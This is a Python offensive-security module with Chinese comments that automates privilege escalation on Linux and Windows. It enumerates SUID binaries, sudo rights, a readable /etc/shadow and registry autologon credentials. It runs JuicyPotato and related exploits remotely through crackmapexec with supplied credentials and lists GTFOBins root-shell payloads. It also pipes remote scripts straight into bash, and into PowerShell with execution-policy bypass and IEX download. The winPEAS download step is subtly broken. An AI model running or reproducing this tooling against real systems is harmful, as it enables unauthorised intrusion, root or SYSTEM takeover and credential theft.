#!/usr/bin/env python3
"""
Privilege Escalation — 提权辅助模块

自动化检测和利用 Windows/Linux 提权向量。
整合 PEASS-ng/BeRoot/Potato 系列等提权方法。

用法：
    from privilege_escalation import PrivEsc
    pe = PrivEsc(kb)

    # 自动检测提权向量
    vectors = pe.enum_linux()
    vectors = pe.enum_windows()

    # 执行提权
    pe.potato(target, method="juicy")
    pe.suid_exploit(binary="/usr/bin/find")
"""

from typing import List, Dict


class PrivEsc:
    """提权辅助器"""

    def __init__(self, kb=None):
        self.kb = kb

    def _run(self, cmd, timeout=120):
        if self.kb and self.kb.is_available():
            return self.kb.run(cmd, timeout=timeout)
        else:
            import subprocess
            try:
                r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
                return {"success": r.returncode == 0, "output": (r.stdout + r.stderr)[:10000]}
            except Exception as e:
                return {"success": False, "output": str(e)}

    # ═══════════════════════════════════════════════════════════
    # Linux 提权枚举
    # ═══════════════════════════════════════════════════════════

    def enum_linux(self) -> Dict:
        """Linux 提权向量枚举"""
        checks = {}

        # 内核版本
        r = self._run("uname -a")
        checks["kernel"] = r.get("output", "").strip()

        # SUID 二进制
        r = self._run("find / -perm -4000 -type f 2>/dev/null | head -30")
        checks["suid_binaries"] = [b.strip() for b in r.get("output", "").split("\n") if b.strip()]

        # 可写目录/文件
        r = self._run("find /etc -writable -type f 2>/dev/null | head -20")
        checks["writable_etc"] = [f.strip() for f in r.get("output", "").split("\n") if f.strip()]

        # Cron 任务
        r = self._run("cat /etc/crontab 2>/dev/null; ls -la /etc/cron.* 2>/dev/null; crontab -l 2>/dev/null")
        checks["cron"] = r.get("output", "")[:2000]

        # sudo 权限
        r = self._run("sudo -l 2>/dev/null")
        checks["sudo"] = r.get("output", "")[:2000]

        # Capabilities
        r = self._run("getcap -r / 2>/dev/null | head -20")
        checks["capabilities"] = r.get("output", "").strip()

        # 内核漏洞建议
        r = self._run("which linux-exploit-suggester 2>/dev/null && linux-exploit-suggester 2>/dev/null | head -50")
        checks["kernel_exploits"] = r.get("output", "")[:3000]

        # Docker/LXC 逃逸
        r = self._run("ls -la /var/run/docker.sock 2>/dev/null; cat /proc/1/cgroup 2>/dev/null | grep docker")
        checks["container"] = r.get("output", "").strip()

        # 密码文件
        r = self._run("cat /etc/shadow 2>/dev/null | head -5")
        checks["shadow_readable"] = bool(r.get("output", "").strip())

        return checks

    def enum_linux_quick(self) -> List[str]:
        """快速提权建议（一行输出）"""
        suggestions = []
        checks = self.enum_linux()

        # SUID 提权
        gtfobins = ["python", "perl", "ruby", "bash", "sh", "find", "vim", "nano",
                    "nmap", "awk", "env", "less", "more", "man", "ftp", "git"]
        for binary in checks.get("suid_binaries", []):
            for g in gtfobins:
                if g in binary:
                    suggestions.append(f"SUID 提权: {binary} → GTFOBins")

        # sudo 提权
        if "NOPASSWD" in checks.get("sudo", ""):
            suggestions.append("sudo NOPASSWD 提权可能")

        # Docker 逃逸
        if "docker" in checks.get("container", ""):
            suggestions.append("Docker 环境 → 可能逃逸")

        # shadow 可读
        if checks.get("shadow_readable"):
            suggestions.append("/etc/shadow 可读 → 离线爆破")

        return suggestions

    # ═══════════════════════════════════════════════════════════
    # Windows 提权枚举
    # ═══════════════════════════════════════════════════════════

    def enum_windows(self, target: str = "", user: str = "", password: str = "") -> Dict:
        """Windows 提权向量枚举"""
        checks = {}

        prefix = ""
        if target and user:
            prefix = f"crackmapexec smb {target} -u '{user}' -p '{password}' -x "

        # 系统信息
        r = self._run(f"{prefix}'systeminfo' 2>/dev/null | head -30" if prefix else "systeminfo | head -30")
        checks["systeminfo"] = r.get("output", "")[:2000]

        # 当前权限
        r = self._run(f"{prefix}'whoami /priv' 2>/dev/null" if prefix else "whoami /priv")
        checks["privileges"] = r.get("output", "")[:2000]

        # 已安装补丁
        r = self._run(f"{prefix}'wmic qfe list brief' 2>/dev/null | head -20" if prefix else "wmic qfe list brief")
        checks["patches"] = r.get("output", "")[:2000]

        # 服务
        r = self._run(f"{prefix}'wmic service get name,pathname,startmode' 2>/dev/null | findstr /i /v \"system32\"" if prefix else "wmic service list brief")
        checks["services"] = r.get("output", "")[:3000]

        # 自动登录凭证
        r = self._run(f"{prefix}'reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>nul' 2>/dev/null" if prefix else "")
        checks["autologon"] = r.get("output", "")[:1000]

        # AlwaysInstallElevated
        r = self._run(f"{prefix}'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul' 2>/dev/null" if prefix else "")
        checks["always_install_elevated"] = "0x1" in r.get("output", "")

        return checks

    # ═══════════════════════════════════════════════════════════
    # 提权利用
    # ═══════════════════════════════════════════════════════════

    def potato(self, target: str, user: str, password: str, method="juicy",
               lhost="", lport=4444) -> Dict:
        """Potato 系列提权（SeImpersonate → SYSTEM）"""
        potato_cmds = {
            "juicy": f"JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a '/c whoami > c:\\temp\\result.txt' -t *",
            "sweet": f"SweetPotato.exe -p c:\\windows\\system32\\cmd.exe -a '/c whoami > c:\\temp\\result.txt'",
            "rotten": f"RottenPotato.exe whoami",
            "god": f"GodPotato.exe -cmd 'whoami > c:\\temp\\result.txt'",
            "print_spoofer": f"PrintSpoofer.exe -c 'whoami > c:\\temp\\result.txt'",
        }
        cmd = potato_cmds.get(method, potato_cmds["juicy"])
        exec_cmd = f"crackmapexec smb {target} -u '{user}' -p '{password}' -x \"{cmd}\" 2>/dev/null"
        r = self._run(exec_cmd, timeout=30)
        return {"method": method, "success": r.get("success", False), "output": r.get("output", "")}

    def suid_exploit(self, binary: str) -> Dict:
        """利用 SUID 二进制提权"""
        gtfo_payloads = {
            "find": "find . -exec /bin/sh -p \\;",
            "python": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
            "python3": "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
            "perl": "perl -e 'exec \"/bin/sh\";'",
            "vim": "vim -c ':!/bin/sh'",
            "nmap": "nmap --interactive; !sh",
            "bash": "bash -p",
            "env": "env /bin/sh -p",
            "awk": "awk 'BEGIN {system(\"/bin/sh -p\")}'",
            "less": "less /etc/passwd  (then !sh)",
            "git": "git -p help config  (then !/bin/sh)",
        }

        for name, payload in gtfo_payloads.items():
            if name in binary:
                return {"binary": binary, "payload": payload, "source": "GTFOBins"}

        return {"binary": binary, "payload": "未找到对应利用方法", "source": "manual"}

    def kernel_exploit(self, kernel_version: str) -> List[Dict]:
        """根据内核版本推荐 exploit"""
        exploits = [
            {"kernel": "2.6.22", "name": "DirtyCow", "cve": "CVE-2016-5195", "url": "https://github.com/dirtycow/dirtycow.github.io"},
            {"kernel": "3.13", "name": "overlayfs", "cve": "CVE-2015-1328", "url": "https://www.exploit-db.com/exploits/37292"},
            {"kernel": "4.4", "name": "DirtyPipe", "cve": "CVE-2022-0847", "url": "https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits"},
            {"kernel": "5.8", "name": "DirtyPipe", "cve": "CVE-2022-0847", "url": "https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits"},
            {"kernel": "5.13", "name": "StackRot", "cve": "CVE-2023-3269", "url": ""},
        ]

        matches = []
        for e in exploits:
            if e["kernel"] in kernel_version:
                matches.append(e)
        return matches

    # ═══════════════════════════════════════════════════════════
    # PEASS-ng 集成
    # ═══════════════════════════════════════════════════════════

    def run_linpeas(self) -> Dict:
        """运行 linPEAS（需要目标可出网或已上传）"""
        cmd = "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>/dev/null | head -200"
        r = self._run(cmd, timeout=300)
        return {"output": r.get("output", ""), "success": r.get("success", False)}

    def run_winpeas(self, target: str, user: str, password: str) -> Dict:
        """运行 winPEAS"""
        cmd = f"crackmapexec smb {target} -u '{user}' -p '{password}' -x 'powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString(\\\"https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe\\\")\"' 2>/dev/null | head -200"
        r = self._run(cmd, timeout=300)
        return {"output": r.get("output", ""), "success": r.get("success", False)}
